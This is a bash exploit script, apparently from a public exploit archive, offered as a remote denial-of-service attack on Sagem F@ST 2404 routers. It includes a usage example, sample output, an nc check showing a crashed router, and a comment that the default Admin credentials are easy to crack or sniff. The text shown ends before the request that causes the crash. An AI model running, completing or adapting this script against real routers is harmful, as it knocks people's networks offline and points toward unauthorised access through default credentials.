# Sagem Router F@ST 2404 Remote Denial Of Service Exploit
# Discovery Date : 01/09/2008
#!/usr/bin/bash
#
# Author    : Underz0ne Crew [Underz0ne.net]
#             Zigma
#
# Severity  : Medium
#
# CVE       : Not assigned
#
# Example   :
#
# Zigma@Underz0ne # ./sagem2404.sh 192.168.1.1
#
# Sagem Router F@ST 2404 Remote Denial Of Service Exploit
#
# By Underz0ne Crew
#
# [+] DoSing Sagem 2404 ...
# [+] Done !
# [+] cya
#
# Zigma@Underz0ne # nc -vvn 192.161.1.1 80
# (UNKNOWN) [192.168.1.1] 80 (?) : Connection refused
#  sent 0, rcvd 0
#
# Tested on 3 Sagem routers F@ST 2404 all got crashed !
#
#PS: M7at7et w mrayech .. Man get a fucking life !!
#

IP=$1

                echo -e "\n Sagem Router F@ST 2404 Remote Denial Of Service Exploit "
                echo -e "\n By Underz0ne Crew "

if [ "$IP" = "" ];then
                echo -e "\n USAGE  : $0 [IP]\n"
                echo -e "\n Example: $0 192.168.1.1\n "
                exit
fi;

                echo -e "\n[+] DoSing Sagem 2404 ..."

# By default the username of sagem's router is Admin so then the pass , sagem uses HTTP Authentication it can be so easly cracked or sniffed !!
